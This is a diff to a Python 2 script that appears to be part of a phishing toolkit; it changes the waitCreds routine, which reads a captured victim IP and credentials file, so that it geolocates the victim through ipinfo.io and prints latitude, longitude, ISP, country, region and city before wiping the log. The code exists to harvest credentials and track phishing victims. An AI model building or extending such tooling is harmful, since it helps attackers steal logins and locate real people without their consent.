@@ -13,6 +13,7 @@ from urllib import urlopen, quote, unquote
 from platform import system as systemos, architecture
 from wget import download
 import re
+import json
 
 
 RED, WHITE, CYAN, GREEN, END = '\033[91m', '\33[46m', '\033[36m', '\033[1;32m', '\033[0m'
@@ -148,14 +149,16 @@ def waitCreds():
             lines = creds.read().rstrip()
         if len(lines) != 0: 
             ip = re.match('victim public ip: (.*)', lines).group(1)
-            resp = unquote(urlopen('https://www.ipip.net/ip.html', 'ip=' + ip).read())
-            searchObj = re.search('时区：(.*?) (.*?) 该地区中心经纬度：(.*?), (.*?)<', resp) # This website is a Chinese website, and this sentence means "timezone: .....  longitude and latitude at this area's center: ......, ......"
-            timezone = searchObj.group(1)
-            longitude = searchObj.group(3)
-            latitude = searchObj.group(4)
+            resp = urlopen('https://ipinfo.io/%s/json' % ip).read()
+            ipinfo = json.loads(resp)
+            matchObj = re.match('^(.*?),(.*)$', ipinfo['loc'])
+            latitude = matchObj.group(1)
+            longitude = matchObj.group(2)
             print '======================================================================'.format(RED, END)
             print ' {0}[ VICTIM INFO FOUND ]{1}:\n {0}%s{1}'.format(GREEN, END) % lines
-            print ' {0}Timezone: %s Longitude: %s Latitude: %s{1} '.format(GREEN, END) % (timezone, longitude, latitude)
+            print ' {0}Longitude: %s Latitude: %s{1}'.format(GREEN, END) % (longitude, latitude)
+            print ' {0}ISP: %s Country: %s{1}'.format(GREEN, END) % (ipinfo['org'], ipinfo['country'])
+            print ' {0}Region: %s City: %s{1}'.format(GREEN, END) % (ipinfo['region'], ipinfo['city'])
             system('rm -rf Server/www/ip.txt && touch Server/www/ip.txt')
             print '======================================================================'.format(RED, END)
             
